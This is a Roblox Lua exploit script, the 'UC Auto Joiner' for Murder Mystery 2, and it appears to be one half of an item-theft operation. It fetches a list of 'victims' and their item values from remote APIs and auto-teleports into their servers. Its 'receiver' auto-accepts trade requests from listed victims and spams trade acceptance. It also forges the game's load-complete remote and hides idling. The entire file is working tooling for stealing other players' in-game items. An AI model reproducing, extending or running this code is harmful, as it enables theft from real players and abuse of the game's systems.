local v_getservice = game.GetService
local VirtualUser = v_getservice(game, "VirtualUser")
local Players = v_getservice(game, "Players")
local TeleportService = v_getservice(game, "TeleportService")
local HttpService = v_getservice(game, "HttpService")
local CoreGui = v_getservice(game, "CoreGui")
local RunService = v_getservice(game, "RunService")
local TweenService = v_getservice(game, "TweenService")
local UserInputService = v_getservice(game, "UserInputService")
local ReplicatedStorage = v_getservice(game, "ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local t_wait, t_spawn, i_new = task.wait, task.spawn, Instance.new
local s_format, s_lower, s_gsub, s_reverse = string.format, string.lower, string.gsub, string.reverse
local t_sort, t_insert, t_remove = table.sort, table.insert, table.remove

LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

local FOLDER_NAME, CONFIG_FILE = "CheetosData", "config.json"
local CONFIG_PATH = FOLDER_NAME .. "/" .. CONFIG_FILE
local CurrentJobId, PlaceId = game.JobId, game.PlaceId
local isMM2 = (PlaceId == 142823291 or PlaceId == 10705210188)

local State = {Victims = {}, LastRefresh = 0, Blacklist = {}, FailedThisCycle = {}, IsTeleporting = false, CurrentTarget = nil, ReceiverActive = false, Gradients = {}}
local Config = {ApiUrls = {}, ApiUrl = "", ScriptUrl = "", AutoJoin = false, MinTargetValue = 10, RefreshRate = 1, TargetIndex = 1}

local function LoadConfig()
    if isfolder(FOLDER_NAME) and isfile(CONFIG_PATH) then
        local s, data = pcall(readfile, CONFIG_PATH)
        if s and data then
            local decoded = HttpService:JSONDecode(data)
            for k, v in pairs(decoded) do Config[k] = v end
        end
    end
    if getgenv().JoinerConfig then
        for k, v in pairs(getgenv().JoinerConfig) do if v ~= nil then Config[k] = v end end
    end
end
LoadConfig()

local function SaveConfig()
    if not isfolder(FOLDER_NAME) then makefolder(FOLDER_NAME) end
    pcall(writefile, CONFIG_PATH, HttpService:JSONEncode(Config))
end

if CoreGui:FindFirstChild("CheetosJoinerUI") then CoreGui.CheetosJoinerUI:Destroy() end
local ScreenGui = i_new("ScreenGui", CoreGui)
ScreenGui.Name = "CheetosJoinerUI"
ScreenGui.ResetOnSpawn = false

local function s(val) return val * 0.5 end

local function applyLedEffect(element, scaleFunc)
    local ledStroke = i_new("UIStroke", element)
    ledStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    ledStroke.Thickness = scaleFunc(2)
    local ledGradient = i_new("UIGradient", ledStroke)
    ledGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
    })
    t_insert(State.Gradients, ledGradient)
end

RunService.RenderStepped:Connect(function()
    local offset = Vector2.new(tick() % 2 - 1, 0)
    for i = 1, #State.Gradients do State.Gradients[i].Offset = offset end
end)

local function formatValue(v)
    return s_reverse(s_gsub(s_reverse(tostring(v)), '(%d%d%d)', '%1,')):gsub('^,', '')
end

local MainFrame = i_new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, s(500), 0, s(350))
MainFrame.Position = UDim2.new(0.5, s(-250), 0, s(10)) 
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
MainFrame.BackgroundTransparency = 0.1
MainFrame.Active, MainFrame.Draggable = true, true
i_new("UICorner", MainFrame).CornerRadius = UDim.new(0, s(8))
applyLedEffect(MainFrame, s)

local InnerFrame = i_new("Frame", MainFrame)
InnerFrame.Size = UDim2.new(1, s(-10), 1, s(-10))
InnerFrame.Position = UDim2.new(0, s(5), 0, s(5))
InnerFrame.BackgroundTransparency = 1

local TitleBar = i_new("Frame", InnerFrame)
TitleBar.Size = UDim2.new(1, 0, 0, s(35))
TitleBar.BackgroundTransparency = 1

local TitleLabel = i_new("TextLabel", TitleBar)
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "UC Auto Joiner (MM2 Only)"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font, TitleLabel.TextSize = Enum.Font.GothamBold, s(18)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

local MinimizeBtn = i_new("TextButton", TitleBar)
MinimizeBtn.Size = UDim2.new(0, s(30), 0, s(30))
MinimizeBtn.Position = UDim2.new(1, -s(30), 0, 0)
MinimizeBtn.BackgroundTransparency = 1
MinimizeBtn.Text, MinimizeBtn.TextColor3 = "-", Color3.fromRGB(255, 255, 255)
MinimizeBtn.Font, MinimizeBtn.TextSize = Enum.Font.GothamBold, s(24)

local ToggleHandle = i_new("TextButton", ScreenGui)
ToggleHandle.Size = UDim2.new(0, s(100), 0, s(30))
ToggleHandle.Position = UDim2.new(0.5, s(-50), 0, 0)
ToggleHandle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ToggleHandle.Text = "▼"
ToggleHandle.Font, ToggleHandle.TextColor3, ToggleHandle.TextSize = Enum.Font.GothamBold, Color3.fromRGB(255, 255, 255), s(20)
ToggleHandle.Visible = false 
i_new("UICorner", ToggleHandle).CornerRadius = UDim.new(0, s(6))
applyLedEffect(ToggleHandle, s)

local function toggleGUI(show)
    local targetPos = show and UDim2.new(0.5, s(-250), 0, s(10)) or UDim2.new(0.5, s(-250), 0, s(-360))
    TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = targetPos}):Play()
    ToggleHandle.Visible = not show
end
MinimizeBtn.MouseButton1Click:Connect(function() toggleGUI(false) end)
ToggleHandle.MouseButton1Click:Connect(function() toggleGUI(true) end)

local TabFrame = i_new("Frame", InnerFrame)
TabFrame.Size = UDim2.new(1, 0, 0, s(30))
TabFrame.Position = UDim2.new(0, 0, 0, s(40))
TabFrame.BackgroundTransparency = 1
i_new("UIListLayout", TabFrame).FillDirection = Enum.FillDirection.Horizontal
TabFrame.UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
TabFrame.UIListLayout.Padding = UDim.new(0, s(5))

local ContentFrame = i_new("Frame", InnerFrame)
ContentFrame.Size = UDim2.new(1, 0, 1, s(-80))
ContentFrame.Position = UDim2.new(0, 0, 0, s(75))
ContentFrame.BackgroundTransparency = 1

local Tabs = {"Targets", "Settings", "Status"}
local TabButtons, Pages = {}, {}
for i, tabName in ipairs(Tabs) do
    local btn = i_new("TextButton", TabFrame)
    btn.Size = UDim2.new(0, s(100), 1, 0)
    btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    btn.BackgroundTransparency = 0.8
    btn.Font, btn.Text, btn.TextSize = Enum.Font.GothamSemibold, tabName, s(14)
    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    i_new("UICorner", btn).CornerRadius = UDim.new(0, s(6))
    applyLedEffect(btn, s)
    TabButtons[tabName] = btn
    local page = i_new("Frame", ContentFrame)
    page.Size, page.BackgroundTransparency = UDim2.new(1, 0, 1, 0), 1
    page.Visible = (i == 1)
    Pages[tabName] = page
end

local function switchTab(target)
    for name, btn in pairs(TabButtons) do
        local active = (name == target)
        btn.BackgroundTransparency = active and 0.5 or 0.8
        btn.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(200, 200, 200)
        Pages[name].Visible = active
    end
end
for name, btn in pairs(TabButtons) do btn.MouseButton1Click:Connect(function() switchTab(name) end) end

local Container = i_new("ScrollingFrame", Pages.Targets)
Container.Size, Container.BackgroundTransparency, Container.BorderSizePixel = UDim2.new(1, 0, 1, 0), 1, 0
Container.ScrollBarThickness, Container.CanvasSize = s(4), UDim2.new(0, 0, 0, 0)
i_new("UIListLayout", Container).Padding = UDim.new(0, s(8))

i_new("UIListLayout", Pages.Settings).Padding = UDim.new(0, s(10))
local function createToggle(parent, text, key)
    local frame = i_new("Frame", parent)
    frame.Size, frame.BackgroundTransparency = UDim2.new(1, 0, 0, s(40)), 1
    local label = i_new("TextLabel", frame)
    label.Size, label.BackgroundTransparency = UDim2.new(0.6, 0, 1, 0), 1
    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(255, 255, 255), text
    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
    local bg = i_new("TextButton", frame)
    bg.Size, bg.Position = UDim2.new(0, s(60), 0, s(30)), UDim2.new(1, s(-60), 0.5, s(-15))
    bg.BackgroundColor3, bg.Text = Color3.fromRGB(255, 255, 255), ""
    bg.BackgroundTransparency = Config[key] and 0.6 or 0.8
    i_new("UICorner", bg).CornerRadius = UDim.new(0, s(12))
    applyLedEffect(bg, s)
    local knob = i_new("Frame", bg)
    knob.Size, knob.BackgroundColor3 = UDim2.new(0, s(20), 0, s(20)), Color3.fromRGB(255, 255, 255)
    knob.Position = Config[key] and UDim2.new(1, s(-25), 0.5, s(-10)) or UDim2.new(0, s(5), 0.5, s(-10))
    i_new("UICorner", knob).CornerRadius = UDim.new(1, 0)
    bg.MouseButton1Click:Connect(function()
        Config[key] = not Config[key]
        bg.BackgroundTransparency = Config[key] and 0.6 or 0.8
        TweenService:Create(knob, TweenInfo.new(0.2), {Position = Config[key] and UDim2.new(1, s(-25), 0.5, s(-10)) or UDim2.new(0, s(5), 0.5, s(-10))}):Play()
        SaveConfig()
    end)
end

local function createInput(parent, text, key)
    local frame = i_new("Frame", parent)
    frame.Size, frame.BackgroundTransparency = UDim2.new(1, 0, 0, s(40)), 1
    local label = i_new("TextLabel", frame)
    label.Size, label.BackgroundTransparency = UDim2.new(0.6, 0, 1, 0), 1
    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(255, 255, 255), text
    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
    local box = i_new("TextBox", frame)
    box.Size, box.Position = UDim2.new(0, s(60), 0, s(30)), UDim2.new(1, s(-60), 0.5, s(-15))
    box.BackgroundColor3, box.TextColor3 = Color3.fromRGB(40, 40, 40), Color3.fromRGB(255, 255, 255)
    box.Text, box.Font, box.TextSize = tostring(Config[key]), Enum.Font.Gotham, s(14)
    i_new("UICorner", box).CornerRadius = UDim.new(0, s(6))
    applyLedEffect(box, s)
    box.FocusLost:Connect(function()
        local n = tonumber(box.Text)
        if n then Config[key] = n; SaveConfig() else box.Text = tostring(Config[key]) end
    end)
end

createToggle(Pages.Settings, "Auto Join", "AutoJoin")
createInput(Pages.Settings, "Min Value", "MinTargetValue")
createInput(Pages.Settings, "Target Index", "TargetIndex")

i_new("UIListLayout", Pages.Status).Padding = UDim.new(0, s(5))
local function createStatusLabel(text)
    local label = i_new("TextLabel", Pages.Status)
    label.Size, label.BackgroundTransparency = UDim2.new(1, 0, 0, s(30)), 1
    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(200, 200, 200), text
    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
    return label
end
local MainStatus = createStatusLabel("Status: Initializing...")
local HitsLabel = createStatusLabel("Available Hits: 0")
local TopHitLabel = createStatusLabel("Top Target: None")
local function setStatus(msg) MainStatus.Text = "Status: " .. msg end

TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage)
    if result == Enum.TeleportResult.GameFull or result == Enum.TeleportResult.ServerFull then
        if State.LastAttemptedJob then State.FailedThisCycle[State.LastAttemptedJob] = true; setStatus("Full - Skipping") end
    end
end)

local function SafeTeleport(placeId, jobId)
    State.LastAttemptedJob = jobId
    TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
end

local function parseJobId(link)
    if not link then return nil end
    return link:match("gameInstanceId=([%w%-]+)") or link:match("JobId=([%w%-]+)")
end

local function parsePlaceId(link)
    if not link then return nil end
    return link:match("games/(%d+)") or link:match("placeId=(%d+)")
end

if isMM2 then
    task.spawn(function()
        local remotes = ReplicatedStorage:WaitForChild("Remotes")
        local loadedRemote = remotes:WaitForChild("Extras"):WaitForChild("LoadedCompletely")
        while true do
            local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
            if PlayerGui then
                local guiNames = {"Loading", "DeviceSelect", "Join", "JoinPhone"}
                for _, name in ipairs(guiNames) do local screen = PlayerGui:FindFirstChild(name) if screen then screen:Destroy() end end
                PlayerGui:SetAttribute("Device", "PC")
                if not PlayerGui:FindFirstChild("MainGUI") then
                    local gf = ReplicatedStorage:FindFirstChild("GUI")
                    local mainGui = gf and (gf:FindFirstChild("MainPC") or gf:FindFirstChild("MainMobile"))
                    if mainGui then local c = mainGui:Clone() c.Name = "MainGUI"; c.Parent = PlayerGui end
                end
                pcall(function() game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
                loadedRemote:FireServer()
            end
            t_wait(0.1)
        end
    end)
end

local function createRow(victim)
    local Row = i_new("Frame", Container)
    Row.Size, Row.BackgroundColor3, Row.BackgroundTransparency = UDim2.new(1, 0, 0, s(60)), Color3.fromRGB(40, 40, 45), 0.3
    i_new("UICorner", Row).CornerRadius = UDim.new(0, s(6))
    applyLedEffect(Row, s)
    local NameLbl = i_new("TextLabel", Row)
    NameLbl.Text, NameLbl.Font, NameLbl.TextSize, NameLbl.TextColor3 = victim.victim, Enum.Font.GothamBold, s(16), Color3.fromRGB(255, 255, 255)
    NameLbl.Position, NameLbl.Size, NameLbl.BackgroundTransparency = UDim2.new(0, s(10), 0, s(5)), UDim2.new(0.5, 0, 0.5, 0), 1
    NameLbl.TextXAlignment = Enum.TextXAlignment.Left
    local ValLbl = i_new("TextLabel", Row)
    ValLbl.Text, ValLbl.Font, ValLbl.TextSize, ValLbl.TextColor3 = "RAP: " .. formatValue(victim.val), Enum.Font.Gotham, s(14), Color3.fromRGB(100, 255, 100)
    ValLbl.Position, ValLbl.Size, ValLbl.BackgroundTransparency = UDim2.new(0, s(10), 0.5, 0), UDim2.new(0.5, 0, 0.5, 0), 1
    ValLbl.TextXAlignment = Enum.TextXAlignment.Left
    local JoinBtn = i_new("TextButton", Row)
    JoinBtn.Size, JoinBtn.Position, JoinBtn.BackgroundColor3 = UDim2.new(0.2, 0, 0.6, 0), UDim2.new(0.55, 0, 0.2, 0), Color3.fromRGB(60, 60, 255)
    JoinBtn.Text, JoinBtn.Font, JoinBtn.TextColor3, JoinBtn.TextSize = "JOIN", Enum.Font.GothamBold, Color3.fromRGB(255, 255, 255), s(14)
    i_new("UICorner", JoinBtn).CornerRadius = UDim.new(0, s(6))
    applyLedEffect(JoinBtn, s)
    JoinBtn.MouseButton1Click:Connect(function()
        local jId = parseJobId(victim.link)
        if jId then setStatus("Teleporting to " .. victim.victim); SafeTeleport(tonumber(parsePlaceId(victim.link) or 142823291), jId) end
    end)
end

local function refreshList()
    for _, c in ipairs(Container:GetChildren()) do if not c:IsA("UIListLayout") then c:Destroy() end end
    t_sort(State.Victims, function(a, b) return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) end)
    HitsLabel.Text = "Available Hits: " .. #State.Victims
    if #State.Victims == 0 then
        local el = i_new("TextLabel", Container)
        el.Text, el.Size, el.BackgroundTransparency, el.TextColor3 = "No Active Targets", UDim2.new(1, 0, 0, s(40)), 1, Color3.fromRGB(150, 150, 150)
        el.Font, el.TextSize = Enum.Font.Gotham, s(14)
    else for _, v in ipairs(State.Victims) do createRow(v) end end
    Container.CanvasSize = UDim2.new(0, 0, 0, #State.Victims * s(70))
end

local function fetchVictims()
    local all = {}
    local sources = Config.ApiUrls or {}
    if (not sources or not next(sources)) and Config.ApiUrl ~= "" then sources = {Config.ApiUrl} end
    for _, url in pairs(sources) do
        if url and url ~= "" then
            local s, res = pcall(function() return HttpService:JSONDecode(game:HttpGet(url:gsub("http://", "https://") .. "?t=" .. os.time())) end)
            if s and type(res) == "table" then
                for _, v in ipairs(res) do if tostring(v.link):find("142823291") or tostring(v.link):find("10705210188") then t_insert(all, v) end end
            end
        end
    end
    State.Victims = all
    refreshList()
    setStatus("Synced: " .. #State.Victims)
end

local function AutoJoinStep()
    if not Config.AutoJoin or State.IsTeleporting or State.ReceiverActive then return end
    t_sort(State.Victims, function(a, b) return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) end)
    local mv = tonumber(Config.MinTargetValue) or 0
    for _, v in ipairs(State.Victims) do
        if tonumber(v.val) >= mv then
            local job = parseJobId(v.link)
            if job == CurrentJobId and Players:FindFirstChild(v.victim) then
                setStatus("Locked on: " .. v.victim)
                TopHitLabel.Text = "Farming: " .. v.victim
                State.CurrentTarget = v; State.FailedThisCycle = {}
                return
            end
        end
    end
    local si = Config.TargetIndex or 1
    local found = false
    for i = si, #State.Victims do
        local t = State.Victims[i]
        if tonumber(t.val) >= mv then
            local j = parseJobId(t.link)
            if j and j ~= CurrentJobId then
                found = true
                if not State.FailedThisCycle[j] then
                    State.CurrentTarget = t
                    setStatus("Chasing #"..i); SafeTeleport(tonumber(parsePlaceId(t.link) or 142823291), j)
                    return
                end
            end
        end
    end
    if found then setStatus("Cycle Finished - Resetting"); State.FailedThisCycle = {} end
end

function startReceiver()
    if isMM2 then
        task.spawn(function()
            local function mm2Main()
                local Trade = ReplicatedStorage:WaitForChild("Trade", 20)
                if not Trade then return end
                local function isV(p)
                    if not p then return false end
                    local n = s_lower(p.Name)
                    for _, v in ipairs(State.Victims) do if n:find(s_lower(v.victim)) then return true end end
                    return false
                end
                local function accept(tn)
                    State.ReceiverActive = true
                    local st = tick()
                    while tick() - st < 3 do
                        Trade.AcceptRequest:FireServer()
                        local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
                        if s and res == "StartTrade" then break end
                        t_wait(0.1)
                    end
                end
                t_spawn(function()
                    while true do
                        local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
                        if s and res == "ReceivingRequest" then Trade.AcceptRequest:FireServer(); State.ReceiverActive = true end
                        t_wait(0.5)
                    end
                end)
                t_spawn(function()
                    while true do
                        pcall(function()
                            local sr = Trade:FindFirstChild("SendRequest")
                            if sr then sr.OnClientInvoke = function(s) if isV(s) then accept(s.Name); return true end; Trade.DeclineRequest:FireServer(); return false end end
                            Trade.SetRequestsEnabled:FireServer(true)
                        end)
                        t_wait(1)
                    end
                end)
                local lov, ctid = 0, 428469873
                Trade.UpdateTrade.OnClientEvent:Connect(function(d) if d then lov = d.LastOffer or lov; ctid = d.TradeId or ctid end end)
                while true do
                    local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
                    if s and res == 'StartTrade' then
                        State.ReceiverActive = true
                        while true do
                            Trade.AcceptTrade:FireServer(ctid, lov)
                            t_wait(0.1)
                            local s2, cur = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
                            if not s2 or cur ~= 'StartTrade' then break end
                        end
                    end
                    State.ReceiverActive = false
                    t_wait(0.5)
                end
            end
            while true do pcall(mm2Main); t_wait(2) end
        end)
    end
end

t_spawn(function() while true do fetchVictims(); t_wait(Config.RefreshRate or 1) end end)
t_spawn(function() while true do AutoJoinStep(); t_wait(1) end end)
t_spawn(startReceiver)
setStatus("Turbo Ready")
